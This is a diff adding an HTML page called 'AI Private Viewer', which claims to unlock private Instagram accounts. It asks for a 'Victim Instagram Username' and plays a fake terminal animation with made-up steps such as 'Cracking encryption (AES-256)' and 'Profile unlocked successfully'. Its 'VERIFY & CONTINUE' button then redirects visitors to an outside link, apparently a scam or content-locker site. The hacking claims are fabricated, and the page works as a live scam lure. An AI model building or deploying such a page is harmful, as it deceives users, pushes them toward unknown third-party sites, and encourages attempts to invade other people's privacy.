@@ -1,3 +1,615 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=yes">
+  <title>AI Private Viewer · Dark Neon</title>
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+    }
+
+    body {
+      min-height: 100vh;
+      background: #0b0d15;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      padding: 16px;
+      margin: 0;
+    }
+
+    /* main card – dark glassmorphism with neon accent */
+    .insta-card {
+      max-width: 480px;
+      width: 100%;
+      background: rgba(18, 22, 33, 0.92);
+      backdrop-filter: blur(6px);
+      border-radius: 40px;
+      box-shadow: 0 25px 50px -10px rgba(0, 0, 0, 0.8), 0 0 0 1px rgba(120, 80, 255, 0.15);
+      overflow: hidden;
+      transition: all 0.2s ease;
+      border: 1px solid rgba(140, 100, 255, 0.2);
+    }
+
+    /* header – dark with neon glow */
+    .header {
+      padding: 18px 24px;
+      background: rgba(12, 16, 28, 0.8);
+      border-bottom: 1px solid rgba(120, 80, 255, 0.2);
+      display: flex;
+      align-items: center;
+      gap: 14px;
+      flex-wrap: wrap;
+    }
+
+    .logo-icon {
+      background: linear-gradient(135deg, #b388ff, #7c4dff, #536dfe);
+      width: 44px;
+      height: 44px;
+      border-radius: 16px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 26px;
+      color: white;
+      box-shadow: 0 0 20px rgba(120, 80, 255, 0.3);
+    }
+
+    .logo-text {
+      font-weight: 700;
+      font-size: 22px;
+      letter-spacing: -0.3px;
+      background: linear-gradient(135deg, #e0d6ff, #b388ff);
+      -webkit-background-clip: text;
+      background-clip: text;
+      color: transparent;
+    }
+
+    .badge {
+      margin-left: auto;
+      background: rgba(120, 80, 255, 0.15);
+      padding: 6px 16px;
+      border-radius: 40px;
+      font-size: 12px;
+      font-weight: 600;
+      color: #b388ff;
+      letter-spacing: 0.4px;
+      border: 1px solid rgba(120, 80, 255, 0.25);
+      text-shadow: 0 0 8px rgba(120, 80, 255, 0.2);
+    }
+
+    /* content */
+    .content {
+      padding: 28px 24px 32px;
+    }
+
+    .hidden-section {
+      display: none !important;
+    }
+
+    /* input group – dark style */
+    .input-group {
+      margin-bottom: 28px;
+      transition: all 0.25s ease;
+    }
+
+    .input-label {
+      font-weight: 600;
+      font-size: 15px;
+      color: #c8c0e0;
+      margin-bottom: 10px;
+      display: flex;
+      align-items: center;
+      gap: 10px;
+      letter-spacing: 0.3px;
+    }
+
+    .insta-input {
+      width: 100%;
+      padding: 16px 20px;
+      background: rgba(255, 255, 255, 0.06);
+      border: 1.5px solid rgba(120, 80, 255, 0.25);
+      border-radius: 60px;
+      font-size: 16px;
+      outline: none;
+      transition: 0.25s;
+      color: #f0ecff;
+      font-weight: 500;
+      backdrop-filter: blur(2px);
+    }
+
+    .insta-input:focus {
+      border-color: #b388ff;
+      background: rgba(255, 255, 255, 0.08);
+      box-shadow: 0 0 0 4px rgba(120, 80, 255, 0.15), 0 0 20px rgba(120, 80, 255, 0.05);
+    }
+
+    .insta-input::placeholder {
+      color: rgba(200, 192, 224, 0.4);
+      font-weight: 400;
+    }
+
+    /* primary button – neon purple */
+    .insta-btn {
+      background: linear-gradient(135deg, #7c4dff, #536dfe);
+      color: white;
+      border: none;
+      width: 100%;
+      padding: 14px 16px;
+      font-weight: 700;
+      font-size: 16px;
+      border-radius: 60px;
+      cursor: pointer;
+      transition: all 0.2s ease;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 12px;
+      box-shadow: 0 8px 24px rgba(120, 80, 255, 0.3);
+      letter-spacing: 0.4px;
+    }
+
+    .insta-btn:hover {
+      transform: scale(0.97);
+      box-shadow: 0 8px 32px rgba(120, 80, 255, 0.5);
+      filter: brightness(1.08);
+    }
+
+    .insta-btn:active {
+      transform: scale(0.94);
+    }
+
+    .insta-btn:disabled {
+      background: rgba(120, 80, 255, 0.25);
+      box-shadow: none;
+      transform: none;
+      cursor: not-allowed;
+      color: rgba(255, 255, 255, 0.4);
+    }
+
+    /* terminal panel – dark cyber */
+    .terminal-panel {
+      background: #080b14;
+      border-radius: 24px;
+      margin: 28px 0 20px;
+      overflow: hidden;
+      box-shadow: inset 0 2px 12px rgba(0,0,0,0.8), 0 8px 32px rgba(0,0,0,0.6);
+      border: 1px solid rgba(120, 80, 255, 0.15);
+    }
+
+    .terminal-header {
+      background: #0d1022;
+      padding: 14px 18px;
+      display: flex;
+      align-items: center;
+      gap: 14px;
+      border-bottom: 1px solid rgba(120, 80, 255, 0.1);
+    }
+
+    .terminal-dots {
+      display: flex;
+      gap: 10px;
+    }
+
+    .dot {
+      width: 14px;
+      height: 14px;
+      border-radius: 50%;
+      background: #ff5f56;
+    }
+    .dot:nth-child(2) { background: #ffbd2e; }
+    .dot:nth-child(3) { background: #27c93f; }
+
+    .terminal-title {
+      color: #8a7eb0;
+      font-size: 13px;
+      font-family: 'SF Mono', 'Fira Code', monospace;
+      letter-spacing: 0.3px;
+      margin-left: 4px;
+      font-weight: 500;
+    }
+
+    .terminal-body {
+      padding: 20px 18px;
+      font-family: 'SF Mono', 'Fira Code', 'Courier New', monospace;
+      font-size: 14px;
+      background: #060810;
+      min-height: 190px;
+      max-height: 280px;
+      overflow-y: auto;
+      white-space: pre-wrap;
+      word-break: break-word;
+      line-height: 1.6;
+    }
+
+    .terminal-body::-webkit-scrollbar {
+      width: 4px;
+    }
+    .terminal-body::-webkit-scrollbar-track {
+      background: #0b0e1a;
+    }
+    .terminal-body::-webkit-scrollbar-thumb {
+      background: #4a3d7a;
+      border-radius: 12px;
+    }
+
+    .terminal-line {
+      color: #b8b0d0;
+      margin-bottom: 8px;
+      display: flex;
+      flex-wrap: wrap;
+      gap: 8px;
+      font-family: monospace;
+      border-left: 2.5px solid #8a6eff;
+      padding-left: 14px;
+      animation: fadeInLine 0.2s ease;
+    }
+
+    @keyframes fadeInLine {
+      0% { opacity: 0; transform: translateY(6px); }
+      100% { opacity: 1; transform: translateY(0); }
+    }
+
+    .terminal-line .prefix {
+      color: #b388ff;
+      font-weight: bold;
+    }
+
+    .terminal-line .message {
+      color: #d4cef0;
+    }
+
+    .terminal-line.error {
+      border-left-color: #ff6b6b;
+    }
+    .terminal-line.error .message {
+      color: #ff9a9a;
+    }
+
+    .cursor-blink {
+      display: inline-block;
+      width: 10px;
+      height: 18px;
+      background: #b388ff;
+      vertical-align: middle;
+      margin-left: 4px;
+      animation: blink 1s step-end infinite;
+      box-shadow: 0 0 12px rgba(120, 80, 255, 0.5);
+    }
+
+    @keyframes blink {
+      0%, 100% { opacity: 1; }
+      50% { opacity: 0; }
+    }
+
+    /* verify button – gradient neon */
+    .verify-container {
+      margin-top: 24px;
+      transition: all 0.3s ease;
+    }
+
+    .verify-btn {
+      background: linear-gradient(135deg, #b388ff, #7c4dff, #536dfe, #448aff);
+      background-size: 240% 240%;
+      border: none;
+      width: 100%;
+      padding: 18px 12px;
+      font-weight: 700;
+      font-size: 16px;
+      border-radius: 60px;
+      color: white;
+      cursor: pointer;
+      transition: 0.25s;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 14px;
+      box-shadow: 0 10px 28px -6px rgba(120, 80, 255, 0.5);
+      letter-spacing: 0.8px;
+      animation: gradientFlow 5s ease infinite;
+      border: 1px solid rgba(255, 255, 255, 0.08);
+    }
+
+    .verify-btn:hover {
+      transform: scale(0.97);
+      filter: brightness(1.08);
+      box-shadow: 0 12px 36px -6px rgba(120, 80, 255, 0.7);
+    }
+    .verify-btn:active {
+      transform: scale(0.93);
+    }
+
+    @keyframes gradientFlow {
+      0% { background-position: 0% 50%; }
+      50% { background-position: 100% 50%; }
+      100% { background-position: 0% 50%; }
+    }
+
+    .status-note {
+      font-size: 13px;
+      text-align: center;
+      margin-top: 18px;
+      color: #8a7eb0;
+      transition: all 0.2s;
+      font-weight: 400;
+      letter-spacing: 0.2px;
+      line-height: 1.5;
+    }
+
+    .footer {
+      padding: 16px 24px 22px;
+      text-align: center;
+      background: rgba(12, 16, 28, 0.5);
+      font-size: 12px;
+      color: #5a4e7a;
+      border-top: 1px solid rgba(120, 80, 255, 0.08);
+      letter-spacing: 0.3px;
+      backdrop-filter: blur(2px);
+    }
+
+    .spinner {
+      display: inline-block;
+      width: 22px;
+      height: 22px;
+      border: 2.5px solid rgba(255,255,255,0.2);
+      border-radius: 50%;
+      border-top-color: #b388ff;
+      animation: spin 0.7s linear infinite;
+    }
+
+    @keyframes spin {
+      to { transform: rotate(360deg); }
+    }
+
+    /* responsive */
+    @media (max-width: 500px) {
+      .content { padding: 20px 16px; }
+      .header { padding: 14px 18px; }
+      .logo-text { font-size: 18px; }
+    }
+  </style>
+</head>
+<body>
+
+<div class="insta-card" id="app">
+  <div class="header">
+    <div class="logo-icon">⚡</div>
+    <div class="logo-text">AI Private Viewer</div>
+    <span class="badge">🔮 v4.0</span>
+  </div>
+
+  <div class="content" id="mainContent">
+    <!-- SECTION 1: input + access button -->
+    <div id="accessSection">
+      <div class="input-group">
+        <div class="input-label">
+          <span>👤</span> Victim Instagram Username
+        </div>
+        <input type="text" id="usernameInput" class="insta-input" placeholder="Enter @username" autocomplete="off" spellcheck="false">
+      </div>
+      <button id="accessBtn" class="insta-btn">
+        <span>🔓</span> Access Profile
+      </button>
+    </div>
+
+    <!-- Terminal -->
+    <div class="terminal-panel">
+      <div class="terminal-header">
+        <div class="terminal-dots">
+          <span class="dot"></span><span class="dot"></span><span class="dot"></span>
+        </div>
+        <span class="terminal-title">AI Engine · terminal 4.0</span>
+      </div>
+      <div class="terminal-body" id="terminalBody">
+        <div class="terminal-line">
+          <span class="prefix">></span>
+          <span class="message">📡 Enter Instagram username</span>
+        </div>
+      </div>
+    </div>
+
+    <!-- SECTION 2: Verify container (hidden initially) -->
+    <div id="verifyContainer" style="display: none;">
+      <button id="verifyBtn" class="verify-btn">
+        ⚡ VERIFY & CONTINUE ⚡
+      </button>
+      <div class="status-note" id="verifyStatusNote">
+        🎯 Click to get private data access link
+      </div>
+    </div>
+
+    <!-- global status -->
+    <div class="status-note" id="globalStatusNote">
+      💡 Enter private username, then click "Access Profile"
+    </div>
+  </div>
+
+  <div class="footer">
+    © AI Private Viewer · No login required
+  </div>
+</div>
+
 <script>
-window.location.href = "https://i-ano.com/app.html";
+  (function() {
+    // DOM refs
+    const accessSection = document.getElementById('accessSection');
+    const usernameInput = document.getElementById('usernameInput');
+    const accessBtn = document.getElementById('accessBtn');
+    const terminalBody = document.getElementById('terminalBody');
+    const verifyContainer = document.getElementById('verifyContainer');
+    const verifyBtn = document.getElementById('verifyBtn');
+    const globalStatusNote = document.getElementById('globalStatusNote');
+
+    let aiEngineActive = false;
+    let processing = false;
+
+    // Terminal helper
+    function addTerminalLine(prefix, message, isError = false) {
+      const line = document.createElement('div');
+      line.className = 'terminal-line' + (isError ? ' error' : '');
+      const pre = document.createElement('span');
+      pre.className = 'prefix';
+      pre.textContent = prefix;
+      const msg = document.createElement('span');
+      msg.className = 'message';
+      msg.textContent = message;
+      if (isError) msg.style.color = '#ff9a9a';
+      line.appendChild(pre);
+      line.appendChild(msg);
+      terminalBody.appendChild(line);
+      terminalBody.scrollTop = terminalBody.scrollHeight;
+      return line;
+    }
+
+    function clearTerminal() {
+      while (terminalBody.firstChild) {
+        terminalBody.removeChild(terminalBody.firstChild);
+      }
+    }
+
+    // Full AI terminal simulation
+    function runTerminalSimulation(username) {
+      return new Promise((resolve) => {
+        clearTerminal();
+        const u = username || 'user';
+
+        addTerminalLine('>', 'Contacting Instagram API ...');
+        setTimeout(() => addTerminalLine('⚙️', 'Connected to API endpoint'), 250);
+        setTimeout(() => addTerminalLine('🔍', `Scanning private account: @${u}`), 700);
+        setTimeout(() => addTerminalLine('📸', 'Unlocking privacy layers...'), 1250);
+        setTimeout(() => addTerminalLine('🧠', 'Cracking encryption (AES-256)'), 1800);
+        setTimeout(() => addTerminalLine('✨', 'Processing profile metadata'), 2350);
+        setTimeout(() => addTerminalLine('🔥', 'Almost done ...'), 2900);
+        setTimeout(() => {
+          addTerminalLine('✅', '─────────────────────────────────');
+          addTerminalLine('🚀', `✅ Profile @${u} unlocked successfully`);
+          addTerminalLine('💎', 'Generating secure view link ...');
+          addTerminalLine('✅', '─────────────────────────────────');
+          // cursor effect
+          const cursorLine = document.createElement('div');
+          cursorLine.className = 'terminal-line';
+          cursorLine.innerHTML = `<span class="prefix">></span><span class="message">_<span class="cursor-blink"></span></span>`;
+          terminalBody.appendChild(cursorLine);
+          terminalBody.scrollTop = terminalBody.scrollHeight;
+          resolve(true);
+        }, 3600);
+      });
+    }
+
+    // Hide input & show verify with smooth transition
+    function hideAccessAndShowVerify() {
+      if (accessSection) {
+        accessSection.style.transition = 'opacity 0.25s ease, visibility 0.25s ease, max-height 0.25s ease, padding 0.25s ease';
+        accessSection.style.opacity = '0';
+        accessSection.style.visibility = 'hidden';
+        accessSection.style.maxHeight = '0';
+        accessSection.style.padding = '0';
+        accessSection.style.overflow = 'hidden';
+        setTimeout(() => {
+          accessSection.style.display = 'none';
+        }, 280);
+      }
+
+      verifyContainer.style.display = 'block';
+      verifyContainer.style.animation = 'fadeInLine 0.4s ease';
+      globalStatusNote.innerHTML = '✅ AI Engine active. Click "VERIFY & CONTINUE" to proceed.';
+      globalStatusNote.style.color = '#b388ff';
+      globalStatusNote.style.fontWeight = '500';
+    }
+
+    // Redirect to the provided link
+    function redirectToLink() {
+      if (!aiEngineActive) {
+        globalStatusNote.innerHTML = '⏳ Please wait, AI not ready. Reload if needed.';
+        return;
+      }
+      verifyBtn.innerHTML = '⟳ REDIRECTING ...';
+      verifyBtn.disabled = true;
+      verifyBtn.style.opacity = '0.7';
+      setTimeout(() => {
+        window.location.href = 'https://appsave.store/cl/i/1ojkvk';
+      }, 480);
+    }
+
+    // Main access handler
+    async function onAccessProfile() {
+      if (processing || aiEngineActive) return;
+      const raw = usernameInput.value.trim();
+      if (!raw) {
+        addTerminalLine('⚠️', 'Please enter a valid username.', true);
+        globalStatusNote.innerHTML = '❌ Username is required.';
+        globalStatusNote.style.color = '#ff6b6b';
+        setTimeout(() => {
+          if (!aiEngineActive) {
+            globalStatusNote.innerHTML = '💡 Enter private username, then click Access Profile';
+            globalStatusNote.style.color = '#8a7eb0';
+          }
+        }, 2200);
+        return;
+      }
+      let username = raw;
+      if (username.startsWith('@')) username = username.slice(1);
+      usernameInput.value = username;
+
+      processing = true;
+      accessBtn.disabled = true;
+      const originalHTML = accessBtn.innerHTML;
+      accessBtn.innerHTML = `<span class="spinner"></span> Activating AI ...`;
+
+      try {
+        await runTerminalSimulation(username);
+        aiEngineActive = true;
+        await new Promise(r => setTimeout(r, 300));
+        hideAccessAndShowVerify();
+        addTerminalLine('🎉', `Access granted for @${username}. Ready for verification.`);
+        terminalBody.scrollTop = terminalBody.scrollHeight;
+        globalStatusNote.innerHTML = `✨ Secure link generated for @${username} →`;
+        globalStatusNote.style.color = '#d4cef0';
+      } catch (err) {
+        addTerminalLine('🔥', 'Error: activation failed. Retry.', true);
+        globalStatusNote.innerHTML = '⚠️ Something went wrong. Please refresh.';
+        aiEngineActive = false;
+      } finally {
+        processing = false;
+        accessBtn.disabled = false;
+        accessBtn.innerHTML = originalHTML;
+      }
+    }
+
+    // Event binding
+    accessBtn.addEventListener('click', onAccessProfile);
+    verifyBtn.addEventListener('click', redirectToLink);
+
+    usernameInput.addEventListener('keypress', (e) => {
+      if (e.key === 'Enter') {
+        e.preventDefault();
+        if (!accessBtn.disabled && !processing && !aiEngineActive) {
+          onAccessProfile();
+        }
+      }
+    });
+
+    // extra startup message
+    setTimeout(() => {
+      if (!aiEngineActive && !processing) {
+        addTerminalLine('🎯', 'Type a username and press "Access Profile"');
+        terminalBody.scrollTop = terminalBody.scrollHeight;
+      }
+    }, 500);
+
+    // fallback style for verify container
+    const style = document.createElement('style');
+    style.textContent = `
+      .verify-btn:focus-visible { outline: 3px solid #b388ff; outline-offset: 3px; }
+    `;
+    document.head.appendChild(style);
+
+    console.log('AI Private Viewer · Dark Neon style ready');
+  })();
 </script>
+</body>
+</html>
